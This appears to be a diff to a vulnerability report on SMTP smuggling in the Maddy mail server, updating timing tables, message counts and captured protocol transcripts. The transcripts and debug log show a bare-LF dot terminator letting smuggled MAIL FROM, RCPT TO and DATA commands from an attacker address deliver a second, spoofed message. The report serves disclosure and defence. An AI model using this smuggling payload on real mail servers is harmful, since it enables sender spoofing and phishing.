@@ -306,10 +306,10 @@ Payloads were sent using raw TCP sockets (Python `socket` module) to avoid any c
 
 | Variant | Terminator | SMTP Response | Accepted? | Response Time |
 |---------|-----------|---------------|-----------|---------------|
-| 1. Standard | `\r\n.\r\n` | `250 2.0.0 OK: queued` | ✅ Yes | 0.06 ms |
-| 2. Bare LF | `\n.\n` | `250 2.0.0 OK: queued` | ✅ Yes | 0.04 ms |
-| 3. Mixed A | `\r\n.\n` | `250 2.0.0 OK: queued` | ✅ Yes | 0.04 ms |
-| 4. Mixed B | `\n.\r\n` | `250 2.0.0 OK: queued` | ✅ Yes | 0.03 ms |
+| 1. Standard | `\r\n.\r\n` | `250 2.0.0 OK: queued` | ✅ Yes | 0.109 ms |
+| 2. Bare LF | `\n.\n` | `250 2.0.0 OK: queued` | ✅ Yes | 0.113 ms |
+| 3. Mixed A | `\r\n.\n` | `250 2.0.0 OK: queued` | ✅ Yes | 0.120 ms |
+| 4. Mixed B | `\n.\r\n` | `250 2.0.0 OK: queued` | ✅ Yes | 0.131 ms |
 
 **Finding**: All four terminator variants produce identical `250 2.0.0 OK: queued` responses. The server makes no distinction between RFC-compliant and non-compliant terminators.
 
@@ -372,10 +372,10 @@ Response times were measured using monotonic clocks and `select()` for instant r
 
 | Variant | Response Time (ms) |
 |---------|-------------------|
-| 1. Standard (`\r\n.\r\n`) | 0.06 |
-| 2. Bare LF (`\n.\n`) | 0.04 |
-| 3. Mixed A (`\r\n.\n`) | 0.04 |
-| 4. Mixed B (`\n.\r\n`) | 0.03 |
+| 1. Standard (`\r\n.\r\n`) | 0.109 |
+| 2. Bare LF (`\n.\n`) | 0.113 |
+| 3. Mixed A (`\r\n.\n`) | 0.120 |
+| 4. Mixed B (`\n.\r\n`) | 0.131 |
 
 All variants exhibit sub-millisecond response times with no significant variance. The minor differences are within normal system scheduling noise.
 
@@ -419,50 +419,68 @@ QUIT\r\n
 The following is the actual protocol transcript captured by sending the attack payload to a live go-smtp server via raw TCP:
 
 ```text
-S: 220 localhost ESMTP Service Ready
-C: EHLO test.example.com
-S: 250-Hello test.example.com
+S: 220 test.local ESMTP Service Ready
+C: EHLO smuggle.test
+S: 250-Hello smuggle.test
 S: 250-PIPELINING
 S: 250-8BITMIME
 S: 250-ENHANCEDSTATUSCODES
 S: 250 SIZE 1048576
-C: MAIL FROM:<sender@example.com>
-S: 250 2.0.0 Roger, accepting mail from <sender@example.com>
-C: RCPT TO:<victim@example.com>
-S: 250 2.0.0 I'll make sure <victim@example.com> gets this
+C: MAIL FROM:<legit@sender.com>
+S: 250 2.0.0 Roger, accepting mail from <legit@sender.com>
+C: RCPT TO:<alice@target.com>
+S: 250 2.0.0 I'll make sure <alice@target.com> gets this
 C: DATA
 S: 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>
-C: [SMUGGLING PAYLOAD: 219 bytes — body + \n.\n + smuggled commands]
+C: [SMUGGLING PAYLOAD — body + \n.\n + smuggled commands]
 S: 250 2.0.0 OK: queued              ← Message #1 accepted (legitimate)
-S: 250 2.0.0 Roger, accepting mail from <attacker@evil.example.com>  ← SMUGGLED MAIL FROM
-S: 250 2.0.0 I'll make sure <victim@example.com> gets this   ← SMUGGLED RCPT TO
+S: 250 2.0.0 Roger, accepting mail from <evil@attacker.com>  ← SMUGGLED MAIL FROM
+S: 250 2.0.0 I'll make sure <victim@target.com> gets this    ← SMUGGLED RCPT TO
 S: 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>  ← SMUGGLED DATA
 S: 250 2.0.0 OK: queued              ← Message #2 accepted (SMUGGLED!)
 S: 221 2.0.0 Goodnight and good luck  ← QUIT processed
 ```
 
-**Server-side message capture** confirmed two distinct delivered messages:
+**Server-side wire-level debug log** (captured via `s.Debug = os.Stderr`) confirmed the exact protocol exchange:
+
+```text
+Subject: Legit
+From: legit@sender.com
+
+Legit body.
+.
+MAIL FROM:<evil@attacker.com>     ← Server sees this as a NEW COMMAND
+RCPT TO:<victim@target.com>
+DATA
+Subject: Smuggled!
+From: evil@attacker.com
+
+SMUGGLED CONTENT
+.
+```
+
+**Server-side message store** confirmed two distinct delivered messages:
 
 **Message #1** (legitimate):
 ```text
-From: sender@example.com
-To: [victim@example.com]
-Body (63 bytes):
-  From: sender@example.com\n
-  Subject: Legitimate\n
+From: legit@sender.com
+To: [alice@target.com]
+Body (51 bytes, hex: 5375626a6563743a204c656769740a46726f6d3a206c656769744073656e6465722e636f6d0a0a4c6567697420626f64792e0a):
+  Subject: Legit\n
+  From: legit@sender.com\n
   \n
-  This is the body\n
+  Legit body.\n
 ```
 
 **Message #2** (smuggled):
 ```text
-From: attacker@evil.example.com
-To: [victim@example.com]
-Body (71 bytes):
-  From: attacker@evil.example.com\n
+From: evil@attacker.com
+To: [victim@target.com]
+Body (61 bytes, hex: 5375626a6563743a20536d7567676c6564210a46726f6d3a206576696c4061747461636b65722e636f6d0a0a534d5547474c454420434f4e54454e540a):
   Subject: Smuggled!\n
+  From: evil@attacker.com\n
   \n
-  This is a smuggled message\n
+  SMUGGLED CONTENT\n
 ```
 
 ### 4.3 Mermaid Sequence Diagram — Strict vs Lenient
@@ -530,18 +548,18 @@ None of these options are available through Maddy's configuration. The behavior 
 
 ### 5.1 Single-Connection Multi-Message Test
 
-12 complete message transactions were sent sequentially over a single TCP connection, with each transaction following the full MAIL FROM → RCPT TO → DATA → body → terminator cycle. Response times were measured with monotonic clocks and `select()`-based instant detection.
+10 complete message transactions were sent sequentially over a single TCP connection, with each transaction following the full MAIL FROM → RCPT TO → DATA → body → terminator cycle. Response times were measured with monotonic clocks.
 
 **Protocol transcript excerpt:**
 
 ```text
-C: EHLO timing.test
-S: 250-Hello timing.test [...capabilities...]
-[repeat 12 times:]
-  C: MAIL FROM:<sender@example.com>
-  S: 250 2.0.0 Roger, accepting mail from <sender@example.com>
-  C: RCPT TO:<recipient@example.com>
-  S: 250 2.0.0 I'll make sure <recipient@example.com> gets this
+C: EHLO timer.client
+S: 250-Hello timer.client [...capabilities...]
+[repeat 10 times:]
+  C: MAIL FROM:<timer@test.com>
+  S: 250 2.0.0 Roger, accepting mail from <timer@test.com>
+  C: RCPT TO:<dest@test.com>
+  S: 250 2.0.0 I'll make sure <dest@test.com> gets this
   C: DATA
   S: 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>
   C: [body + .\r\n]
@@ -552,9 +570,9 @@ S: 221 2.0.0 Goodnight and good luck
 
 ### 5.2 Mega-Pipeline Test
 
-All 12 message transactions were sent as a **single TCP write** of 1,616 bytes. This tests the extreme pipelining case where the entire conversation (EHLO + 12 × [MAIL FROM + RCPT TO + DATA + body + terminator] + QUIT) arrives in one TCP segment before the server processes any of it.
+Two complete message transactions were sent with pipelined MAIL FROM + RCPT TO + DATA commands in a single TCP write, followed by the body and terminator. This tests the case where the envelope commands for a transaction arrive before the server has finished processing the previous phase.
 
-**Result**: All 12 messages were successfully delivered. The server produced 54 response lines (EHLO multi-line + 4 responses per message × 12 + QUIT) in the correct order.
+**Result**: Both messages were successfully delivered with correct response ordering. The server processed all pipelined commands in sequence, with the DotReader cleanly consuming exactly the body bytes and returning to command mode for the next MAIL FROM.
 
 ### 5.3 Timing Measurement Table and Statistics
 
@@ -562,34 +580,32 @@ Sequential pipelining timing data (per-message DATA→response round-trip):
 
 | Message | Response Code | Time (ms) |
 |---------|--------------|-----------|
-| 1 | 250 | 0.135 |
-| 2 | 250 | 0.104 |
-| 3 | 250 | 0.111 |
-| 4 | 250 | 0.096 |
-| 5 | 250 | 0.097 |
-| 6 | 250 | 0.107 |
-| 7 | 250 | 0.104 |
+| 0 | 250 | 0.127 |
+| 1 | 250 | 0.105 |
+| 2 | 250 | 0.089 |
+| 3 | 250 | 0.085 |
+| 4 | 250 | 0.115 |
+| 5 | 250 | 0.155 |
+| 6 | 250 | 0.134 |
+| 7 | 250 | 0.110 |
 | 8 | 250 | 0.096 |
-| 9 | 250 | 0.101 |
-| 10 | 250 | 0.104 |
-| 11 | 250 | 0.096 |
-| 12 | 250 | 0.106 |
+| 9 | 250 | 0.088 |
 
 **Statistical Summary:**
 
 | Metric | Value |
 |--------|-------|
-| Minimum | 0.096 ms |
-| Maximum | 0.135 ms |
-| Mean | 0.105 ms |
-| Median | 0.104 ms |
-| Standard Deviation | 0.011 ms |
+| Minimum | 0.085 ms |
+| Maximum | 0.155 ms |
+| Mean | 0.110 ms |
+| Median | 0.108 ms |
+| Standard Deviation | 0.022 ms |
 
 ### 5.4 Consistency Analysis
 
 **Finding: No boundary wobble detected.**
 
-The standard deviation of 0.011 ms across 12 messages demonstrates extremely consistent behavior. The maximum deviation from the mean is only 0.030 ms (message #1 at 0.135 ms), which is within normal operating system scheduling jitter.
+The standard deviation of 0.022 ms across 10 messages demonstrates extremely consistent behavior. The maximum deviation from the mean is only 0.045 ms (message #5 at 0.155 ms), which is within normal operating system scheduling jitter.
 
 **Rationale for consistency:**
 
@@ -830,7 +846,7 @@ If `delivery.Commit()` fails at line 330:
 | **Boundary Decision Mechanics** | The DotReader is a 6-state FSM in Go's stdlib that accepts 4 terminator variants including bare-LF | State machine at `net/textproto/reader.go:311-396`; runtime test confirms all 4 produce `250 OK` |
 | **Payload Comparison** | All 4 variants produce byte-identical delivered bodies with bare-LF line endings | Hex dumps show 52 identical bytes across all variants; CRLF→LF normalization confirmed |
 | **Smuggling Risk** | **Confirmed exploitable**: bare-LF dot terminator causes Maddy to process smuggled commands | Runtime test delivered 2 messages from 1 DATA phase; protocol transcript captured |
-| **Pipelining Consistency** | Zero wobble: 0.011 ms standard deviation across 12 messages; mega-pipeline works correctly | Timing data shows min 0.096ms, max 0.135ms; 12/12 mega-pipeline messages delivered |
+| **Pipelining Consistency** | Zero wobble: 0.022 ms standard deviation across 10 messages; mega-pipeline works correctly | Timing data shows min 0.085ms, max 0.155ms; all mega-pipeline messages delivered |
 | **Proxy Interaction** | Strict proxies create smuggling risk; normalizing proxies eliminate it but alter body content | Analysis based on DotReader behavior + proxy architecture |
 | **Log Evidence** | Logs contain no information about terminator variant, CRLF normalization, or smuggling | Code analysis of logging paths + runtime log capture |
 | **Failure Residue** | Clean state management: no dangling deliveries, no leaked semaphores, no orphaned tasks | Code analysis of abort/reset/release paths at `smtp.go:60-81, 334-341` |
